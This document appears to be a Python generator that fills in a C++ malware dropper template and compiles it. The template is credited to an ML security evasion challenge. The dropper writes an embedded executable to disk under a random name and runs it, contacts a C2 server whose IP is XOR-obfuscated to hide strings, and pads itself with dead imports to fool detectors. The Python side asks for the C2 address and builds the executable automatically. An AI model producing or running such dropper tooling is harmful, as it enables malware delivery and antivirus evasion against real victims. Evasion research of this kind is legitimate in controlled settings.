template = """// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// Required Imports
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"helper.h"	// Resources Definition
#include<time.h>		// rand seed

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>
#include<Uxtheme.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")

// Functions prototypes
void dead();
void drop(int size, void *buffer);
void* XOR(void *data, int size);
void* base64decode(void *data,DWORD *size);
void launch();
void set_name();

// Dropper Configurations
#define DEAD_IMPORTS
//#define XOR_ENCODE
#define XOR_KEY 0x73
//#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
//#define INJECT

// global: final binary name
char name[10*NAME_SIZE];
typedef unsigned char BYTE;
char ObfuscatedIP[64];
char ObfRealIP[64];

//real IP
BYTE dataOne[] = {{ {realIPObfNostring} }};

BYTE dataTwo[] = {{ {ObfNoString} }};

int main()
{{
	
	HMODULE h = GetModuleHandle(NULL);
	HRSRC r = FindResource(h,MAKEINTRESOURCE(IDR_BIN1),MAKEINTRESOURCE(BIN));
	HGLOBAL rc = LoadResource(h,r);
	void* data = LockResource(rc);
	DWORD size = SizeofResource(h,r);
	
	printf("Connecting to IP: {stringIP}");

    xorIP(ObfRealIP, sizeof(ObfRealIP), dataOne, sizeof(dataOne));

    sendHTTPRequest(ObfRealIP);

    xorIP(ObfuscatedIP, sizeof(ObfuscatedIP), dataTwo, sizeof(dataTwo));

    checkTCPConnections(ObfuscatedIP);
	
#ifdef XOR_ENCODE
	data = XOR(data,size);
#endif
#ifdef BASE64
	data = base64decode(data,&size);
#endif
	set_name();
	drop(size, data);
	launch();
#ifdef DEAD_CODE
	dead();
#endif
	return 0;
}}

void set_name()
{{
#ifdef RANDOM_NAME
	int valid=0;
	srand(time(NULL));
	while(valid<NAME_SIZE)
	{{
		char c = rand();
		if(c>='a' && c<='z')
		{{
			name[valid++]=c;
		}}
	}}
#else
	strcpy(name,"proc");
#endif
#ifdef INJECT
	strcat(name,".dll");
#else
	strcat(name,".exe");
#endif
}}

void launch()
{{
	
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    ZeroMemory( &pi, sizeof(pi));
#ifdef INJECT
	char cmd[10*NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
	char args[10*NAME_SIZE];
	sprintf(args,"%s %s,#1",cmd,name);
	CreateProcessA(cmd,args,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
#else
	CreateProcessA(name,NULL,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi );
#endif
}}

void* base64decode(void *data,DWORD *size)
{{
	return data;
}}

void* XOR(void *data, int size){{
	return data;
}}

void drop(int size, void *buffer)
{{
	FILE *f = fopen(name,"wb");
    for(int i=0;i<size;i++)
    {{
        unsigned char c1 = ((char*)buffer)[i];
        fprintf(f,"%c",c1);
    }}
    fclose(f);
}}

// Dead Imports Function
void dead()
{{
	return;
	memcpy(NULL,NULL,NULL);
	memset(NULL,NULL,NULL);
	strcpy(NULL,NULL);
	ShellAboutW(NULL,NULL,NULL,NULL);
	SHGetSpecialFolderPathW(NULL,NULL,NULL,NULL);
	ShellMessageBox(NULL,NULL,NULL,NULL,NULL);
	RegEnumKeyExW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegOpenKeyExW(NULL,NULL,NULL,NULL,NULL);
	RegEnumValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegGetValueW(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegDeleteKeyW(NULL,NULL);
	RegQueryInfoKeyW(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	RegQueryValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
	RegSetValueExW(NULL,NULL,NULL,NULL,NULL,NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL,NULL,NULL);
	BSTR_UserFree(NULL,NULL);
	BufferedPaintClear(NULL,NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x,NULL,NULL,x,NULL);
	IsThemeActive();
	ImageList_Add(NULL,NULL,NULL);
	ImageList_Create(NULL,NULL,NULL,NULL,NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL,NULL,NULL,NULL);
	CreateThread(NULL,NULL,NULL,NULL,NULL,NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL,NULL);
	lstrcmpW(NULL,NULL);
	MulDiv(NULL,NULL,NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL,NULL,NULL,NULL,NULL,NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL,NULL,NULL,NULL);
	HeapSize(NULL,NULL,NULL);
	SetBkColor(NULL,NULL);
	SetBkMode(NULL,NULL);
	EmptyClipboard();
	CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL,NULL);
	CombineRgn(NULL,NULL,NULL,NULL);
	SetRectRgn(NULL,NULL,NULL,NULL,NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL,NULL);
	CreateRectRgn(NULL,NULL,NULL,NULL);
	CreateCompatibleBitmap(NULL,NULL,NULL);
	LineTo(NULL,NULL,NULL);
	MoveToEx(NULL,NULL,NULL,NULL);
	ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
	GetObjectW(NULL,NULL,NULL);
	GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
	GetTextMetricsW(NULL,NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL,NULL);
	GetDeviceCaps(NULL,NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL,NULL);
	GetTextExtentPointW(NULL,NULL,NULL,NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL,NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL,NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL,NULL,NULL);
	isalpha(NULL);

}}
"""

from ctypes import *
import subprocess


def fileGenerate(file, stringIP, realIP, ObfIP):
    
    filename = f"{file}.cpp"
    with open(filename, "w") as file:
        
        file.write(template.format(realIPObfNostring=realIP, ObfNoString=ObfIP, stringIP=escape_c_string(stringIP.strip())))

    print(f"Generated {filename}")

def escape_c_string(s):
    return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")


if __name__ == "__main__":
    filename = input("Enter name of new C++ file: ")
    ip1 = input("Enter IP #1 (Just used for strings): ")
    ip2 = input("Enter IP #2 (C2 Server IP, No strings, Obfuscated): ").encode("utf-8")
    ip3 = input("Enter IP #3 (No connection, No strings, Obfuscated): ").encode("utf-8")

    c_functions = CDLL("C:\\Users\\Angel\\Desktop\\projects\\AutoGenerateDropper\\c_functions.dll")

    c_functions.encrypt_ip.argtypes = [c_char_p]
    c_functions.encrypt_ip.restype = c_char_p

    c_functions.free_buffer.argtypes = [c_void_p]
    c_functions.free_buffer.restype = None

    print("Implementing String IP.")

    realIP_ptr = c_functions.encrypt_ip(ip2)

    realIP_result = realIP_ptr.decode("utf-8")

    print("XOR Encrypt of real IP:", realIP_result)
    print("Implementing real IP.")

    obfIP_ptr = c_functions.encrypt_ip(ip3)

    obfIP_result = obfIP_ptr.decode("utf-8")

    print("XOR Encrypt of Obfuscated IP:", obfIP_result)
    print("Implementing Obfuscated IP.")

    fileGenerate(filename, ip1, realIP_result, obfIP_result)

    userinput = input("Auto compile file?(Y/N): ")

    if(userinput.upper() == "N"):
        quit()

    try:
        subprocess.run(['gcc', '-c', 'helper.c', '-o', 'helper.o'], check=True)
        subprocess.run(['g++', '-c', f'{filename}.cpp', '-o', f'{filename}.o'], check=True)
        subprocess.run(['g++', f'{filename}.o', 'helper.o', '-o', f'{filename}.exe', '-lwinhttp', '-liphlpapi', '-lws2_32'], check=True)
        print("Auto compiled:", f"{filename}.exe")

    except subprocess.CalledProcessError as e:
        print("Build failed:", e)
    
    # free memory
    c_functions.free_buffer(realIP_ptr)
    c_functions.free_buffer(obfIP_ptr)